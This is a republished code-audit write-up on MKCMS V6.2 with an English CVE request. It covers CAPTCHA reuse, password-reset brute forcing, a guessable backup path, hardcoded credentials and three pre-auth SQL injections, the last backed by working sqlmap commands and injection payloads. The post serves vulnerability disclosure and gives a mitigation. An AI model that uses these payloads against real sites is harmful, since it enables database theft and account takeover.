---
title: "[Guest Post] MKCMS Code Audit Notes"
slug: szhnn0
translationKey: szhnn0
date: 2020-04-10T21:55:55+08:00
source: yuque/penetration
---

Originally published on the Xianzhi community: [MKCMS代码审计小结 - 先知社区](https://xz.aliyun.com/t/7580)



> MKCMS V6.2    (source code below comes from the Internet)
>
> MKCMS Miku video source code 6.2, an open-source CMS
>
> Download link: [https://pan.baidu.com/s/1cZX5x9SbcXMCMXismfH4ow](https://pan.baidu.com/s/1cZX5x9SbcXMCMXismfH4ow)  extraction code: k3ox
>
> Alternate download: [https://www.lanzous.com/ib7zwmh](https://www.lanzous.com/ib7zwmh)
>



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212203651-bd33ce55-3bea-4e5e-b129-bbe3ad474665.png)



## .htaccess
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212300645-2fdfae47-c768-4bf1-980a-f1c2abb5bd44.png)







# 0x00 Global Filter Analysis
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212074702-2da62da1-103e-44e1-a381-99ae355f1a6f.png)



`/system/library.php:` uses `addslashes` to escape incoming parameters; note that `$_SERVER` is not filtered

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586576535561-9161a459-66b4-4503-b922-836306186781.png)



# 0x01 CAPTCHA Reuse
The logic at the CAPTCHA check in `/admin/cms_login.php` is as follows: it compares the CAPTCHA in the session with the one entered, and if they don't match it goes into `alert_href`, a `js` redirect that effectively refreshes the page

```php
/admin/cms_login.php:
<?php 
 6   ...
 7  if(isset($_POST['submit'])){
 8:     if ($_SESSION['verifycode'] != $_POST['verifycode']) {
 9  		alert_href('验证码错误','cms_login.php');
10  	}
   ...
     
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586527513750-5968d776-6be5-4cab-bdec-e2f61f12998c.png)

After the redirect the CAPTCHA would be refreshed, but I'm using Burp, which doesn't execute js by default



Searching globally for this `$_SESSION['verifycode']`, I found it is only assigned in `/system/verifycode.php`. That means if, after using a CAPTCHA, we don't follow the `js` redirect, the CAPTCHA is never reset — **so the CAPTCHA can be reused**

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586526980113-b6ec9c98-72ea-4dac-926d-b2eef01f0227.png)

Replaying with Burp confirms it: the CAPTCHA is effectively useless



# 0x02 Front-End Injection 1: `/ucenter/repass.php`
I looked through the historical vulnerabilities and found an unauthorized password-change bug in `/ucenter/repass.php` ([CVE-2019-11332](https://nvd.nist.gov/vuln/detail/CVE-2019-11332)). Following the code in, it turned out there was also an injection. Here's the analysis:

```php
/ucenter/repass.php
<?php
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
$email = trim($_POST['email']);
// check whether the username exists
$query = mysql_query("select u_id from mkcms_user where u_name='$username' and u_email='$email'");
  ...
    
```

As mentioned before, the global filter applies `addslash` escaping to `$_POST` (adding `\` to escape), but here the parameter is passed through `stripslashes` (removing the `\`) — isn't that just an injection?

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586529907632-efc6c088-ccac-49d1-9a5e-192abfb8293d.png)

Later, in retrospect, it turned out that `coolcat` had already raised this issue on Xianzhi last year: [某KCMS5.0 代码审计 (前台注入&任意用户密码重置)，](https://xz.aliyun.com/t/4189#toc-1) — master, respect!



# 0x03 Front-End Injection 2: /ucenter/active.php
`/ucenter/active.php?verify=1` has an injection

```php
/ucenter/active.php
<?php
...
$verify = stripslashes(trim($_GET['verify']));	// strips the escaping \
$nowtime = time();
$query = mysql_query("select u_id from mkcms_user where u_question='$verify'");
$row = mysql_fetch_array($query);
...
```

sqlmap can exploit it directly

```php
[INFO] GET parameter 'verify' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[INFO] GET parameter 'verify' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
```





# 0x04 Front-End Injection 3: /ucenter/reg.php
The `name` parameter of `/ucenter/reg.php` has an injection

```php
/ucenter/reg.php
<?php 
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
// check whether the username exists
$query = mysql_query("select u_id from mkcms_user where u_name='$username'");
  ...
```



# 0x05 Arbitrary User Password Recovery (Password Can Be Brute-Forced)
Arbitrary user password recovery

The problem lies in the password-recovery logic in `/ucenter/repass.php`: once line 10 finds a matching `username` and `email`, line 14 just resets the password directly... Moreover, the password's range is given on line 12 — only 90000 possibilities. After the reset, just run it through Burp and it's done, right? (Of course, this only works for effective brute-forcing when combined with the CAPTCHA reuse)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586531781382-73625b5c-3937-4196-bbc2-6cf8f6502f37.png)



# 0x06 Guessable Backup File Path
This backup feature is unbelievable, and with such a simple filename too

`/backupdata/movie.sql`

```php
/admin/cms_backup.php
<?php
$filename="../backupdata/".DATA_NAME.".sql"; // storage path, stored by default at the outermost level of the project
$fp = fopen($filename,'w');
fputs($fp,$mysql);
fclose($fp);
alert_href('备份成功!','cms_data.php');
?>
```

Searching globally for the `DATA_NAME` variable shows it's the database name set during installation

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586532921372-d8f79355-fc36-4612-8234-3a24d17571ba.png)



The default `DATA_NAME` value is `movie`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586533096304-2b6954a4-c78e-43ed-a0a0-39d0b69ec5c7.png)



# 0x07 Front-End File Upload
`/editor/php/upload_json.php?dir=file`

The source code is as follows

```php
<?php 
$ext_arr = array(
	'image' => array('gif', 'jpg', 'jpeg', 'png', 'bmp'),
	'flash' => array('swf', 'flv'),
	'media' => array('swf', 'flv', 'mp3', 'wav', 'wma', 'wmv', 'mid', 'avi', 'mpg', 'asf', 'rm', 'rmvb'),
	'file' => array('doc', 'docx', 'xls', 'xlsx', 'ppt', 'htm', 'html', 'txt', 'zip', 'rar', 'gz', 'bz2' ,'7z'),
);
...
$file_name = $_FILES['imgFile']['name'];
...
// get the file extension
	$temp_arr = explode(".", $file_name);
	$file_ext = array_pop($temp_arr);
	$file_ext = trim($file_ext); /* converts file_ext to a string... no weak-typing issue **/
	$file_ext = strtolower($file_ext);  // converts file_ext to a string... no weak-typing issue
	// checks whether the extension is in the big array; in_array has a weak-typing issue
	if (in_array($file_ext, $ext_arr[$dir_name]) === false) {
		alert("上传文件扩展名是不允许的扩展名。\n只允许" . implode(",", $ext_arr[$dir_name]) . "格式。");
	}result
  ...
  
  
```

Files in the list can be uploaded, but you can't get a shell this way

```http
POST /editor/php/upload_json.php?dir=file HTTP/1.1
Host: localhost
Content-Length: 306
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryni3BwmVzIUwKfSSC
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryni3BwmVzIUwKfSSC
Content-Disposition: form-data; name="imgFile"; filename="1.jpg.html"
Content-Type: application/octet-stream

11111111
------WebKitFormBoundaryni3BwmVzIUwKfSSC
Content-Disposition: form-data; name="upload"

Send
------WebKitFormBoundaryni3BwmVzIUwKfSSC--

```

An upload link appears

# 0x08 Hardcoded Credentials
`/ucenter/yanzhengma.php` — the password is hardcoded right in it. Tested, and it works for login (~~just a joke, don't take it seriously~~![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586684264225-6679e12b-ad44-4554-9c50-fffeb4a39bcd.png)

# 0x09 Broken Access Control
`/ucenter/mingxi.php`

The membership-card information is determined solely by user-supplied parameters, so a broken-access-control vulnerability definitely exists

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586685476288-83c13069-03f6-4f34-8897-0f0830027cee.png)





# Postscript
## txprotect.php
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212179406-a3b9f3b3-3747-4c1e-94cc-866b73382dea.png)



---

# CVE Request : English Version
> Source code can be downloaded  at  [https://www.lanzous.com/ib7zwmh](https://www.lanzous.com/ib7zwmh)
>



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586581112081-f4a882d1-ad62-40f9-9a0c-d9188bad1a68.png)

# 0x00:Lead In
This CMS is kinda funny, coz there is a universal filter `addslashes`  in `/system/library.php`

```php
/system/library.php
<?php
...
if (!get_magic_quotes_gpc()) {
	if (!empty($_GET)) {
		$_GET = addslashes_deep($_GET);
	}
	if (!empty($_POST)) {
		$_POST = addslashes_deep($_POST);
	}
	$_COOKIE = addslashes_deep($_COOKIE);
	$_REQUEST = addslashes_deep($_REQUEST);
}
function addslashes_deep($_var_0)
{
	if (empty($_var_0)) {
		return $_var_0;
	} else {
		return is_array($_var_0) ? array_map('addslashes_deep', $_var_0) : addslashes($_var_0);
	}_var_0
}
```



While it uses `stripslashes` somewhere by mistake,  let's do a global search about it, we get** 3 SQL injections **

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586576676672-8bef147b-e4c1-4e41-951b-38e9cc20e422.png)

# 0x01:PreAuth SQL injection in /ucenter/repass.php
MKCMS V6.2 has SQL injection via the /ucenter/repass.php _name_ parameter.	

```php
/ucenter/repass.php
<?php
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
$email = trim($_POST['email']);
// check whether the username exists
$query = mysql_query("select u_id from mkcms_user where u_name='$username' and u_email='$email'");
  ...
    
```

and it can be automated exploited by sqlmap namely

```php
sqlmap -u http://localhost/ucenter/repass.php  --data "name=1&email=1@1.com" -p name 


Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=11' AND (SELECT 7672 FROM (SELECT(SLEEP(5)))NmRk) AND 'VTKx'='VTKx&email=222@222.m&submit=

```

And this can be tracked in 2019 via [https://xz.aliyun.com/t/4189#toc-1  ](https://xz.aliyun.com/t/4189#toc-1)by [CoolCat](https://xz.aliyun.com/u/12470), so CVE request of this vuln won't belong to me, I just wanna enrich the CVE database.

# 0x02:PreAuth SQL injection in /ucenter/active.php
MKCMS V6.2 has SQL injection via the /ucenter/active.php _verify_ parameter.	

```php
/ucenter/active.php
<?php
...
$verify = stripslashes(trim($_GET['verify']));	// strips the escaping \
$nowtime = time();
$query = mysql_query("select u_id from mkcms_user where u_question='$verify'");
$row = mysql_fetch_array($query);
...
```



Likewise, attackers can exploit it via sqlmap by typing

```shell
sqlmap -u http://localhost/ucenter/active.php?verify=1 


Parameter: verify (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: verify=1' AND (SELECT 5656 FROM (SELECT(SLEEP(5)))xcPF) AND 'TRJq'='TRJq

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: verify=1' UNION ALL SELECT CONCAT(0x7171786b71,0x706d4e457048744251624653456d554a685a77654c66497a736d704c7454586462716f457a56587a,0x71707a7671)-- WUGv
		
```

# 0x03:PreAuth SQL injection in /ucenter/reg.php
MKCMS V6.2 has SQL injection via the /ucenter/reg.php _name_ parameter.h

```php
/ucenter/reg.php
<?php 
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
// check whether the username exists
$query = mysql_query("select u_id from mkcms_user where u_name='$username'");
  ...
```

Again, sqlmap can be used to automate the exploitation

```php
sqlmap -u http://localhost/ucenter/reg.php  --data "name=1&submit=1@1.com" -p name  


Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=1' AND 2487=2487 AND 'WOhs'='WOhs&submit=1@1.com

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=1' AND (SELECT 6840 FROM (SELECT(SLEEP(5)))rygh) AND 'eoEE'='eoEE&submit=1@1.com

```

# 0x04:Mitigation
remove the `stripslashes()` before the POST/GET param, thus we can't exploit it unless the coding of MYSQL is GBK/GB2312, i.e._wide byte sql injection._

(In my opinion,  is there any need to escape the name? it has never been allowed at all !  
